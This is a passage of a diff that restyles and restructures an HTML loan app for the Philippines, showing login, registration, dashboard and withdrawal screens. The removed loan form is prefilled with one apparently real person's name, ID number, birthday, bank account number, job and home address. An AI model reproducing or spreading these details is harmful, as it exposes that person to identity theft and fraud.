@@ -1,622 +1,1234 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>Fast & Safe Loans | Bank Loan PH</title>
-  <style>
-    :root {
-      --bg: #fafafa;
-      --surface: #ffffff;
-      --surface2: #f5f5f5;
-      --primary: #f0b90b;
-      --primary-dark: #e5a800;
-      --primary-light: #fef6d8;
-      --text: #1e2329;
-      --text2: #707a8a;
-      --border: #eaecef;
-      --green: #02c076;
-      --green-light: #e6f9f1;
-      --red: #f84960;
-      --red-light: #fdebee;
-      --blue: #1e5af7;
-      --blue-light: #e8edfd;
-      --radius: 12px;
-      --shadow-sm: 0 1px 2px rgba(0,0,0,0.03);
-      --shadow: 0 4px 12px rgba(0,0,0,0.04);
-      --transition: 0.2s cubic-bezier(0.4,0,0.2,1);
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Fast & Safe Loans Philippines</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+  :root{--yellow:#f0b90b;--yellow-dark:#d4a309;--yellow-light:#fff8e1;--bg:#fafafa;--card:#ffffff;--border:#e8e8e8;--text:#1a1a1a;--text2:#666;--text3:#999;--shadow:0 2px 16px rgba(0,0,0,0.08);--radius:16px;}
+  body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;justify-content:center;align-items:flex-start;}
+  #app{width:100%;max-width:480px;min-height:100vh;background:var(--bg);position:relative;overflow-x:hidden;}
+  .screen{display:none;min-height:100vh;flex-direction:column;}
+  .screen.active{display:flex;}
 
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+  /* TOAST */
+  #toast{position:fixed;top:20px;left:50%;transform:translateX(-50%) translateY(-80px);background:#1a1a1a;color:#fff;padding:12px 24px;border-radius:50px;font-size:14px;font-weight:500;z-index:9999;transition:transform .4s cubic-bezier(.175,.885,.32,1.275);white-space:nowrap;pointer-events:none;}
+  #toast.show{transform:translateX(-50%) translateY(0);}
+  #toast.success{background:#00c853;}
+  #toast.error{background:#f44336;}
+  #toast.info{background:#1a1a1a;}
 
-    body {
-      font-family: 'Inter', 'BinancePlex', system-ui, -apple-system, sans-serif;
-      background: var(--bg);
-      color: var(--text);
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: flex-start;
-      padding: 10px;
-      -webkit-font-smoothing: antialiased;
-    }
+  /* OVERLAY */
+  .overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(8px);z-index:8000;display:none;flex-direction:column;align-items:center;justify-content:center;padding:24px;}
+  .overlay.active{display:flex;}
+  .overlay-card{background:#fff;border-radius:24px;padding:32px 24px;width:100%;max-width:340px;text-align:center;box-shadow:0 24px 64px rgba(0,0,0,.2);}
+  .overlay-card h3{font-size:20px;font-weight:700;margin-bottom:8px;color:var(--text);}
+  .overlay-card p{font-size:14px;color:var(--text2);margin-bottom:24px;line-height:1.6;}
 
-    #app {
-      width: 100%;
-      max-width: 480px;
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-      padding-bottom: 30px;
-    }
+  /* SVG CIRCLE TIMER */
+  .circle-timer{position:relative;width:140px;height:140px;margin:0 auto 20px;}
+  .circle-timer svg{transform:rotate(-90deg);}
+  .circle-timer .track{fill:none;stroke:#eee;stroke-width:8;}
+  .circle-timer .progress{fill:none;stroke:var(--yellow);stroke-width:8;stroke-linecap:round;transition:stroke-dashoffset .9s linear;}
+  .circle-timer .time-label{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;}
+  .circle-timer .time-label span{font-size:28px;font-weight:800;color:var(--text);}
+  .circle-timer .time-label small{font-size:11px;color:var(--text3);font-weight:500;letter-spacing:.5px;}
 
-    .screen {
-      display: none;
-      flex-direction: column;
-      gap: 12px;
-      animation: fadeSlide 0.3s ease;
-    }
-    .screen.active { display: flex; }
+  /* AUTH SCREENS */
+  .auth-wrap{flex:1;display:flex;flex-direction:column;justify-content:center;padding:32px 24px;}
+  .auth-logo{display:flex;align-items:center;gap:12px;margin-bottom:40px;}
+  .auth-logo .logo-icon{width:48px;height:48px;background:var(--yellow);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:800;color:#1a1a1a;}
+  .auth-logo .logo-text{display:flex;flex-direction:column;}
+  .auth-logo .logo-text strong{font-size:18px;font-weight:800;color:var(--text);}
+  .auth-logo .logo-text span{font-size:12px;color:var(--text3);font-weight:400;}
+  .auth-title{font-size:26px;font-weight:800;margin-bottom:8px;}
+  .auth-sub{font-size:14px;color:var(--text2);margin-bottom:32px;}
+  .form-group{margin-bottom:16px;}
+  .form-group label{display:block;font-size:13px;font-weight:600;color:var(--text2);margin-bottom:6px;letter-spacing:.3px;}
+  .form-group input,.form-group select{width:100%;padding:14px 16px;border:1.5px solid var(--border);border-radius:12px;font-size:15px;font-family:inherit;background:#fff;color:var(--text);outline:none;transition:border-color .2s,box-shadow .2s;-webkit-appearance:none;}
+  .form-group input:focus,.form-group select:focus{border-color:var(--yellow);box-shadow:0 0 0 3px rgba(240,185,11,.12);}
+  .form-group .pw-wrap{position:relative;}
+  .form-group .pw-wrap input{padding-right:48px;}
+  .form-group .pw-toggle{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--text3);font-size:18px;padding:4px;}
+  .btn-primary{width:100%;padding:16px;background:var(--yellow);color:#1a1a1a;border:none;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer;transition:background .2s,transform .1s;margin-top:8px;font-family:inherit;}
+  .btn-primary:active{transform:scale(.98);background:var(--yellow-dark);}
+  .btn-primary:disabled{opacity:.6;cursor:not-allowed;}
+  .auth-switch{text-align:center;margin-top:20px;font-size:14px;color:var(--text2);}
+  .auth-switch a{color:var(--yellow-dark);font-weight:600;cursor:pointer;text-decoration:none;}
+  .form-row{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
 
-    @keyframes fadeSlide {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    @keyframes pulse {
-      0%,100% { transform: scale(1); }
-      50% { transform: scale(1.03); }
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
+  /* DASHBOARD */
+  #screen-dashboard{padding-bottom:80px;}
+  .dash-header{background:#fff;padding:16px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--border);position:sticky;top:0;z-index:100;}
+  .dash-logo{display:flex;align-items:center;gap:10px;}
+  .dash-logo .logo-icon{width:36px;height:36px;background:var(--yellow);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:800;color:#1a1a1a;}
+  .dash-logo strong{font-size:15px;font-weight:800;}
+  .btn-logout{background:none;border:1.5px solid var(--border);border-radius:8px;padding:7px 14px;font-size:13px;font-weight:600;cursor:pointer;color:var(--text2);font-family:inherit;transition:all .2s;}
+  .btn-logout:hover{border-color:#f44336;color:#f44336;}
 
-    /* header */
-    .header {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 8px 0;
-    }
-    .logo-area {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-    .logo-icon {
-      width: 36px; height: 36px;
-      background: var(--primary);
-      border-radius: 8px;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 22px; font-weight: 800; color: #1e2329;
-      box-shadow: 0 2px 8px rgba(240,185,11,0.3);
-    }
-    .logo-text {
-      font-size: 18px; font-weight: 700; color: var(--text);
-      letter-spacing: -0.3px;
-    }
-    .logo-text span { color: var(--primary-dark); }
-    .btn-logout {
-      background: var(--surface); border: 1px solid var(--border); color: var(--text2);
-      padding: 8px 16px; border-radius: 8px; font-weight: 600; font-size: 12px;
-      cursor: pointer; transition: var(--transition);
-    }
-    .btn-logout:hover { background: var(--surface2); }
+  /* BALANCE CARD */
+  .balance-card{background:linear-gradient(135deg,#1a1a1a 0%,#2d2d2d 100%);margin:20px;border-radius:20px;padding:24px;color:#fff;position:relative;overflow:hidden;}
+  .balance-card::before{content:'';position:absolute;top:-40px;right:-40px;width:160px;height:160px;background:rgba(240,185,11,.15);border-radius:50%;}
+  .balance-card::after{content:'';position:absolute;bottom:-60px;left:-20px;width:200px;height:200px;background:rgba(240,185,11,.08);border-radius:50%;}
+  .balance-label{font-size:12px;font-weight:500;color:rgba(255,255,255,.6);letter-spacing:.8px;text-transform:uppercase;margin-bottom:8px;}
+  .balance-amount{font-size:36px;font-weight:800;color:#fff;margin-bottom:4px;line-height:1.2;}
+  .balance-amount .currency{font-size:22px;font-weight:600;vertical-align:super;margin-right:2px;}
+  .balance-card-row{display:flex;align-items:center;justify-content:space-between;margin-top:16px;}
+  .status-badge{padding:5px 12px;border-radius:50px;font-size:11px;font-weight:700;letter-spacing:.5px;text-transform:uppercase;}
+  .badge-none{background:rgba(255,255,255,.15);color:rgba(255,255,255,.8);}
+  .badge-pending{background:rgba(255,165,0,.2);color:#ffb74d;}
+  .badge-approved{background:rgba(0,200,83,.2);color:#69f0ae;}
+  .badge-rejected{background:rgba(244,67,54,.2);color:#ef9a9a;}
+  .loan-type{font-size:12px;color:rgba(255,255,255,.5);font-weight:500;}
 
-    /* cards */
-    .card {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: var(--radius);
-      padding: 16px;
-      box-shadow: var(--shadow-sm);
-    }
-    .card-accent {
-      border-left: 3px solid var(--primary);
-      background: var(--primary-light);
-    }
+  /* TABS */
+  .tab-bar{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:480px;background:#fff;border-top:1px solid var(--border);display:flex;z-index:200;padding-bottom:env(safe-area-inset-bottom);}
+  .tab-item{flex:1;display:flex;flex-direction:column;align-items:center;padding:10px 4px 8px;cursor:pointer;transition:color .2s;border:none;background:none;font-family:inherit;color:var(--text3);}
+  .tab-item.active{color:var(--yellow-dark);}
+  .tab-item .tab-icon{font-size:22px;margin-bottom:3px;line-height:1;}
+  .tab-item .tab-label{font-size:10px;font-weight:600;letter-spacing:.3px;}
 
-    .balance-row {
-      display: flex; align-items: center; justify-content: space-between;
-      margin-bottom: 4px;
-    }
-    .balance-label {
-      font-size: 12px; color: var(--text2); text-transform: uppercase; letter-spacing: 0.5px;
-    }
-    .balance-amount {
-      font-size: 32px; font-weight: 800; color: var(--text);
-      display: flex; align-items: baseline; gap: 4px;
-    }
-    .balance-amount small { font-size: 16px; font-weight: 600; color: var(--text2); }
-    .status-pill {
-      display: inline-flex; align-items: center; gap: 6px;
-      padding: 6px 12px; border-radius: 20px; font-size: 11px; font-weight: 600;
-    }
-    .status-pending { background: #fef6d8; color: #b8860b; }
-    .status-approved { background: var(--green-light); color: #0e6245; }
-    .status-rejected { background: var(--red-light); color: #b91c1c; }
-    .status-bank { background: #f5f5f5; color: #707a8a; }
+  /* TAB PANELS */
+  .tab-panel{display:none;padding:0 0 20px;}
+  .tab-panel.active{display:block;}
 
-    /* inputs */
-    .input-group { margin-bottom: 12px; }
-    .input-group label {
-      display: block; font-size: 11px; font-weight: 600; color: var(--text2);
-      margin-bottom: 4px; text-transform: uppercase; letter-spacing: 0.4px;
-    }
-    .input-group input, .input-group select {
-      width: 100%; padding: 12px 14px; background: var(--surface2);
-      border: 1px solid var(--border); border-radius: 8px; color: var(--text);
-      font-size: 14px; outline: none; font-family: inherit; transition: var(--transition);
-    }
-    .input-group input:focus, .input-group select:focus {
-      border-color: var(--primary); box-shadow: 0 0 0 3px rgba(240,185,11,0.08);
-      background: #fff;
-    }
+  /* SECTION CARDS */
+  .section-card{background:#fff;margin:0 20px 16px;border-radius:var(--radius);padding:20px;box-shadow:var(--shadow);border:1px solid var(--border);}
+  .section-title{font-size:16px;font-weight:700;margin-bottom:16px;display:flex;align-items:center;gap:8px;}
+  .section-title .icon{font-size:18px;}
 
-    /* buttons */
-    .btn {
-      display: inline-flex; align-items: center; justify-content: center; gap: 8px;
-      padding: 13px 20px; border-radius: 8px; font-weight: 600; font-size: 13px;
-      cursor: pointer; border: none; transition: var(--transition); width: 100%;
-      font-family: inherit; text-transform: uppercase; letter-spacing: 0.5px;
-    }
-    .btn-primary { background: var(--primary); color: #1e2329; }
-    .btn-primary:hover { background: var(--primary-dark); }
-    .btn-outline { background: transparent; border: 1px solid var(--primary); color: var(--primary-dark); }
-    .btn-success { background: var(--green); color: #fff; }
-    .btn-sm { padding: 8px 16px; font-size: 11px; width: auto; border-radius: 6px; }
+  /* STAT GRID */
+  .stat-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:0 20px 16px;}
+  .stat-card{background:#fff;border-radius:14px;padding:16px;box-shadow:var(--shadow);border:1px solid var(--border);}
+  .stat-card .s-label{font-size:11px;color:var(--text3);font-weight:600;letter-spacing:.4px;text-transform:uppercase;margin-bottom:6px;}
+  .stat-card .s-value{font-size:20px;font-weight:800;color:var(--text);}
+  .stat-card .s-value.yellow{color:var(--yellow-dark);}
 
-    /* nav tabs */
-    .nav-tabs {
-      display: flex; gap: 4px; background: var(--surface2);
-      padding: 4px; border-radius: 10px; overflow-x: auto;
-    }
-    .nav-item {
-      flex: 1 0 auto; padding: 10px 14px; text-align: center;
-      border-radius: 8px; cursor: pointer; font-size: 12px; font-weight: 600;
-      white-space: nowrap; color: var(--text2); background: transparent; border: none;
-      transition: var(--transition);
-    }
-    .nav-item.active {
-      background: var(--surface); color: var(--primary-dark);
-      box-shadow: var(--shadow-sm); font-weight: 700;
-    }
+  /* LOAN FORM */
+  .loan-form-wrap{padding:0 20px;}
+  .loan-form-wrap .form-group{margin-bottom:14px;}
+  .loan-form-wrap .form-group input,.loan-form-wrap .form-group select{padding:12px 14px;font-size:14px;}
 
-    .dash-section { display: none; }
-    .dash-section.active { display: block; }
+  /* BANK GRID */
+  .bank-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:16px;}
+  .bank-card{background:#fff;border:2px solid var(--border);border-radius:12px;padding:12px 8px;display:flex;flex-direction:column;align-items:center;gap:6px;cursor:pointer;transition:all .2s;}
+  .bank-card:active{transform:scale(.96);}
+  .bank-card.selected{border-color:var(--yellow);background:var(--yellow-light);}
+  .bank-card .bank-icon{font-size:22px;}
+  .bank-card .bank-name{font-size:10px;font-weight:700;color:var(--text2);text-align:center;line-height:1.2;}
+  .bank-card.selected .bank-name{color:var(--yellow-dark);}
 
-    /* bank grid */
-    .bank-grid {
-      display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-top: 6px;
-    }
-    .bank-item {
-      background: var(--surface); border: 1px solid var(--border); border-radius: 8px;
-      padding: 10px 4px; text-align: center; cursor: pointer; transition: var(--transition);
-    }
-    .bank-item:hover { border-color: var(--primary); }
-    .bank-item.selected { border-color: var(--primary); background: var(--primary-light); }
-    .bank-item .bank-icon { font-size: 20px; display: block; margin-bottom: 2px; }
-    .bank-item .bank-name { font-size: 10px; color: var(--text2); font-weight: 500; }
+  /* PROFILE */
+  .profile-header{background:linear-gradient(135deg,var(--yellow) 0%,var(--yellow-dark) 100%);margin:20px;border-radius:20px;padding:24px;text-align:center;}
+  .profile-avatar{width:72px;height:72px;background:rgba(255,255,255,.25);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:32px;margin:0 auto 12px;}
+  .profile-name{font-size:20px;font-weight:800;color:#1a1a1a;}
+  .profile-email{font-size:13px;color:rgba(26,26,26,.6);margin-top:4px;}
+  .profile-list{background:#fff;margin:0 20px;border-radius:var(--radius);overflow:hidden;box-shadow:var(--shadow);border:1px solid var(--border);}
+  .profile-item{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;border-bottom:1px solid var(--border);}
+  .profile-item:last-child{border-bottom:none;}
+  .profile-item .p-label{font-size:13px;color:var(--text3);font-weight:500;}
+  .profile-item .p-value{font-size:13px;font-weight:700;color:var(--text);}
 
-    /* overlays */
-    .overlay {
-      position: fixed; inset: 0; background: rgba(0,0,0,0.7);
-      backdrop-filter: blur(8px); z-index: 100; display: flex;
-      align-items: center; justify-content: center; flex-direction: column; color: #fff;
-    }
-    .overlay.hidden { display: none; }
-    .verify-circle {
-      width: 100px; height: 100px; border-radius: 50%;
-      border: 3px solid rgba(255,255,255,0.2); border-top-color: var(--primary);
-      animation: spin 1s linear infinite; display: flex;
-      align-items: center; justify-content: center; margin-bottom: 16px; font-size: 30px;
-    }
-    .countdown-text { font-size: 30px; font-weight: 700; color: var(--primary); }
-    .overlay p { color: #eaecef; font-size: 13px; }
-    .overlay .btn-outline { border-color: var(--primary); color: var(--primary); margin-top: 14px; width: auto; }
+  /* MODAL */
+  .modal-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:9000;display:none;align-items:center;justify-content:center;padding:20px;}
+  .modal-backdrop.active{display:flex;}
+  .modal-box{background:#fff;border-radius:20px;width:100%;max-width:360px;overflow:hidden;position:relative;}
+  .modal-head{padding:16px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;}
+  .modal-head h4{font-size:16px;font-weight:700;}
+  .modal-close{background:none;border:none;font-size:24px;cursor:pointer;color:var(--text3);line-height:1;}
+  .modal-body{padding:0;}
+  .modal-body img{width:100%;display:block;}
 
-    .modal-overlay {
-      position: fixed; inset: 0; background: rgba(0,0,0,0.5);
-      backdrop-filter: blur(4px); z-index: 150; display: flex;
-      align-items: center; justify-content: center;
-    }
-    .modal-overlay.hidden { display: none; }
-    .modal-content {
-      background: var(--surface); border-radius: var(--radius); padding: 20px;
-      max-width: 320px; width: 90%; box-shadow: 0 20px 40px rgba(0,0,0,0.2);
-    }
-    .modal-content img { width: 100%; border-radius: 8px; margin-top: 10px; }
+  /* WITHDRAW AMOUNT */
+  .withdraw-form{padding:0 20px;}
+  .withdraw-form .form-group{margin-bottom:14px;}
+  .withdraw-form .form-group input{padding:12px 14px;font-size:14px;}
 
-    .toast {
-      position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
-      background: #1e2329; color: #fff; padding: 12px 20px; border-radius: 8px;
-      font-weight: 600; z-index: 200; animation: fadeSlide 0.3s ease;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
-    }
+  /* DIVIDER */
+  .divider{height:1px;background:var(--border);margin:0 20px 16px;}
 
-    ::-webkit-scrollbar { width: 3px; height: 3px; }
-    ::-webkit-scrollbar-thumb { background: #d0d5dd; border-radius: 8px; }
+  /* SECTION LABEL */
+  .section-label{font-size:11px;font-weight:700;color:var(--text3);letter-spacing:.8px;text-transform:uppercase;margin:0 20px 10px;}
 
-    @media (max-width: 380px) {
-      .bank-grid { grid-template-columns: repeat(3,1fr); }
-      .balance-amount { font-size: 28px; }
-    }
-  </style>
+  /* ANIMATIONS */
+  @keyframes fadeIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+  .tab-panel.active{animation:fadeIn .25s ease;}
+
+  /* SCROLL */
+  .scroll-area{overflow-y:auto;-webkit-overflow-scrolling:touch;}
+
+  /* ADMIN NOTICE */
+  .admin-tag{background:var(--yellow-light);border:1px solid var(--yellow);border-radius:8px;padding:8px 12px;font-size:12px;color:var(--yellow-dark);font-weight:600;margin:0 20px 12px;}
+
+  /* STEPS */
+  .step-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--yellow);margin-right:6px;}
+
+  /* INPUT NUMBER NO ARROWS */
+  input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{-webkit-appearance:none;margin:0;}
+  input[type=number]{-moz-appearance:textfield;}
+
+  /* SELECT */
+  select option{color:#1a1a1a;}
+
+  /* VERIFIED BADGE */
+  .verified-strip{background:#e8f5e9;border:1px solid #a5d6a7;border-radius:10px;padding:10px 14px;margin:0 20px 12px;font-size:13px;color:#2e7d32;font-weight:600;display:flex;align-items:center;gap:8px;}
+</style>
 </head>
 <body>
-  <div id="toastContainer"></div>
+<div id="app">
 
-  <div id="app">
-    <!-- LOGIN -->
-    <div class="screen active" id="screen-login">
-      <div style="text-align:center; padding: 28px 0 12px;">
-        <div style="display:inline-flex; align-items:center; gap:8px;">
-          <div class="logo-icon">₱</div>
-          <div class="logo-text">Fast & Safe <span>Loans</span></div>
-        </div>
-        <p style="color:var(--text2); font-size:12px; margin-top:4px;">Philippines · Bank Loan Partner</p>
-      </div>
-      <div class="card card-accent" style="text-align:center;">
-        <h3 style="color:#b8860b; margin-bottom:4px;">🔐 Client Login</h3>
-        <p style="color:var(--text2); font-size:12px;">Secure access to your loan account</p>
-      </div>
-      <div class="card">
-        <div class="input-group"><label>Email</label><input type="email" id="loginEmail" placeholder="yourname@gmail.com"></div>
-        <div class="input-group"><label>Password</label><input type="password" id="loginPassword" placeholder="Enter password"></div>
-        <button class="btn btn-primary" onclick="handleLogin()">Log In</button>
-        <p style="text-align:center; margin-top:12px; font-size:12px; color:var(--text2);">
-          New user? <a href="#" onclick="showScreen('screen-register')" style="color:var(--primary-dark); font-weight:700;">Create Account</a>
-        </p>
-      </div>
-    </div>
+  <!-- TOAST -->
+  <div id="toast"></div>
 
-    <!-- REGISTER -->
-    <div class="screen" id="screen-register">
-      <div style="text-align:center; padding: 24px 0 8px;">
-        <div style="display:inline-flex; align-items:center; gap:8px;">
-          <div class="logo-icon">₱</div>
-          <div class="logo-text">New Account</div>
+  <!-- ===================== LOGIN SCREEN ===================== -->
+  <div id="screen-login" class="screen active">
+    <div class="auth-wrap">
+      <div class="auth-logo">
+        <div class="logo-icon">₱</div>
+        <div class="logo-text">
+          <strong>Fast &amp; Safe Loans</strong>
+          <span>Philippines • Trusted Since 2020</span>
         </div>
       </div>
-      <div class="card">
-        <div class="input-group"><label>Full Name</label><input type="text" id="regName" placeholder="As per Philippine ID"></div>
-        <div class="input-group"><label>ID Name</label><input type="text" id="regIdName" placeholder="Name on ID"></div>
-        <div class="input-group"><label>ID Card Number</label><input type="text" id="regIdNumber" placeholder="ID number"></div>
-        <div class="input-group"><label>Email</label><input type="email" id="regEmail" placeholder="yourname@gmail.com"></div>
-        <div class="input-group"><label>Password</label><input type="password" id="regPassword" placeholder="Min 6 characters"></div>
-        <div class="input-group"><label>Confirm Password</label><input type="password" id="regConfirmPassword" placeholder="Re-enter password"></div>
-        <button class="btn btn-primary" onclick="handleRegister()">Create Account</button>
-        <p style="text-align:center; margin-top:12px; font-size:12px;">
-          Already registered? <a href="#" onclick="showScreen('screen-login')" style="color:var(--primary-dark); font-weight:700;">Login</a>
-        </p>
-      </div>
-    </div>
-
-    <!-- DASHBOARD -->
-    <div class="screen" id="screen-dashboard">
-      <div class="header">
-        <div class="logo-area">
-          <div class="logo-icon">₱</div>
-          <div class="logo-text">Fast & Safe <span>Loans</span></div>
+      <h1 class="auth-title">Welcome Back 👋</h1>
+      <p class="auth-sub">Sign in to your account to continue</p>
+      <form id="login-form" autocomplete="off">
+        <div class="form-group">
+          <label for="login-email">Email Address</label>
+          <input type="email" id="login-email" placeholder="Enter your email" autocomplete="new-password" inputmode="email">
         </div>
-        <button class="btn-logout" onclick="handleLogout()">Log Out</button>
-      </div>
-
-      <div class="card card-accent">
-        <div class="balance-row">
-          <span class="balance-label">Available Balance</span>
-          <span class="status-pill status-bank" id="dashLoanStatus">Bank Loan</span>
-        </div>
-        <div class="balance-amount">₱<span id="dashBalance">0.00</span></div>
-      </div>
-
-      <div class="nav-tabs" id="dashNav">
-        <button class="nav-item active" onclick="switchDashTab('home')">🏠 Home</button>
-        <button class="nav-item" onclick="switchDashTab('loan')">📋 Loan</button>
-        <button class="nav-item" onclick="switchDashTab('withdraw')">💸 Withdraw</button>
-        <button class="nav-item" onclick="switchDashTab('profile')">👤 Profile</button>
-        <button class="nav-item" onclick="openPhotoModal()">📷 ID</button>
-      </div>
-
-      <div class="dash-section active" id="dash-home">
-        <div class="card">
-          <h4 style="color:var(--primary-dark); margin-bottom:10px;">📊 Overview</h4>
-          <div style="display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border);">
-            <span style="color:var(--text2);">Balance</span>
-            <span style="font-weight:700;color:var(--green);" id="homeBal">₱0.00</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border);">
-            <span style="color:var(--text2);">Loan Status</span>
-            <span id="homeLoanStatus" style="font-weight:600;">Bank Loan</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;padding:8px 0;">
-            <span style="color:var(--text2);">Type</span>
-            <span style="font-weight:600;color:var(--blue);">Personal Bank Loan</span>
+        <div class="form-group">
+          <label for="login-password">Password</label>
+          <div class="pw-wrap">
+            <input type="password" id="login-password" placeholder="Enter your password" autocomplete="new-password">
+            <button type="button" class="pw-toggle" onclick="togglePw('login-password',this)">👁</button>
           </div>
         </div>
-      </div>
+        <button type="submit" class="btn-primary" id="login-btn">Sign In</button>
+      </form>
+      <p class="auth-switch">Don't have an account? <a onclick="showScreen('screen-register')">Create Account</a></p>
+    </div>
+  </div>
 
-      <div class="dash-section" id="dash-loan">
-        <div class="card card-accent"><h4 style="color:#b8860b;">📋 Loan Application</h4></div>
-        <div class="card">
-          <div class="input-group"><label>Full Name</label><input type="text" id="loanFullName" value="SHANE SABAL"></div>
-          <div class="input-group"><label>ID Number</label><input type="text" id="loanIdNumber" value="4830645821731280"></div>
-          <div class="input-group"><label>Gender</label><select id="loanGender"><option>Female</option><option>Male</option></select></div>
-          <div class="input-group"><label>Birthday</label><input type="date" id="loanBirthday" value="2004-01-10"></div>
-          <div class="input-group"><label>Bank Name</label><input type="text" id="loanBank" value="Shane Sabal"></div>
-          <div class="input-group"><label>Account No.</label><input type="text" id="loanBankAccount" value="0000079315821"></div>
-          <div class="input-group"><label>Marital Status</label><select id="loanMarital"><option>Single</option><option>Married</option></select></div>
-          <div class="input-group"><label>Education</label><select id="loanEducation"><option>Graduate and Above</option><option>College</option></select></div>
-          <div class="input-group"><label>Career</label><input type="text" id="loanCareer" value="BPO agent"></div>
-          <div class="input-group"><label>Province</label><input type="text" id="loanProvince" value="Davao del sur, Davao city"></div>
-          <div class="input-group"><label>Address</label><input type="text" id="loanAddress" value="PCA road purok 4 Bago Oshiro"></div>
-          <div class="input-group"><label>Loan Amount (₱)</label><input type="number" id="loanAmount" placeholder="Enter amount"></div>
-          <button class="btn btn-primary" onclick="submitLoanApplication()">Submit Application</button>
+  <!-- ===================== REGISTER SCREEN ===================== -->
+  <div id="screen-register" class="screen">
+    <div class="auth-wrap" style="padding-top:20px;">
+      <div class="auth-logo">
+        <div class="logo-icon">₱</div>
+        <div class="logo-text">
+          <strong>Fast &amp; Safe Loans</strong>
+          <span>Philippines</span>
         </div>
       </div>
+      <h1 class="auth-title">Create Account</h1>
+      <p class="auth-sub">Fill in your details to get started</p>
+      <form id="register-form" autocomplete="off">
+        <div class="form-group">
+          <label>Full Name</label>
+          <input type="text" id="reg-fullname" placeholder="Enter your full name" autocomplete="off">
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>ID Name</label>
+            <input type="text" id="reg-idname" placeholder="Name on ID" autocomplete="off">
+          </div>
+          <div class="form-group">
+            <label>ID Card Number</label>
+            <input type="text" id="reg-idnumber" placeholder="ID Number" autocomplete="off">
+          </div>
+        </div>
+        <div class="form-group">
+          <label>Email Address</label>
+          <input type="email" id="reg-email" placeholder="Enter email" autocomplete="off" inputmode="email">
+        </div>
+        <div class="form-group">
+          <label>Password</label>
+          <div class="pw-wrap">
+            <input type="password" id="reg-password" placeholder="Min. 6 characters" autocomplete="new-password">
+            <button type="button" class="pw-toggle" onclick="togglePw('reg-password',this)">👁</button>
+          </div>
+        </div>
+        <div class="form-group">
+          <label>Confirm Password</label>
+          <div class="pw-wrap">
+            <input type="password" id="reg-confirm" placeholder="Repeat password" autocomplete="new-password">
+            <button type="button" class="pw-toggle" onclick="togglePw('reg-confirm',this)">👁</button>
+          </div>
+        </div>
+        <button type="submit" class="btn-primary" id="register-btn">Create Account</button>
+      </form>
+      <p class="auth-switch">Already have an account? <a onclick="showScreen('screen-login')">Sign In</a></p>
+    </div>
+  </div>
 
-      <div class="dash-section" id="dash-withdraw">
-        <div class="card card-accent"><h4 style="color:#b8860b;">💸 Withdraw</h4></div>
-        <div class="card">
-          <h5 style="margin-bottom:6px;">🏦 Banks</h5><div class="bank-grid" id="bankGrid"></div>
-          <h5 style="margin-top:10px;margin-bottom:6px;">📱 Wallets</h5><div class="bank-grid" id="mobileGrid"></div>
-          <div class="input-group" style="margin-top:10px;"><label>Amount (₱)</label><input type="number" id="withdrawAmount"></div>
-          <div class="input-group"><label>Password</label><input type="password" id="withdrawPassword"></div>
-          <button class="btn btn-success" onclick="submitWithdrawal()">Process</button>
+  <!-- ===================== DASHBOARD SCREEN ===================== -->
+  <div id="screen-dashboard" class="screen">
+    <!-- Header -->
+    <div class="dash-header">
+      <div class="dash-logo">
+        <div class="logo-icon">₱</div>
+        <strong>FSL Philippines</strong>
+      </div>
+      <button class="btn-logout" onclick="doLogout()">Log Out</button>
+    </div>
+
+    <!-- Balance Card -->
+    <div class="balance-card">
+      <div class="balance-label">Available Balance</div>
+      <div class="balance-amount"><span class="currency">₱</span><span id="disp-balance">0.00</span></div>
+      <div class="balance-card-row">
+        <div>
+          <div class="loan-type">Bank Loan • Philippines</div>
+        </div>
+        <div id="disp-status-badge" class="status-badge badge-none">No Loan</div>
+      </div>
+    </div>
+
+    <!-- TAB PANELS -->
+    <!-- HOME TAB -->
+    <div id="panel-home" class="tab-panel active">
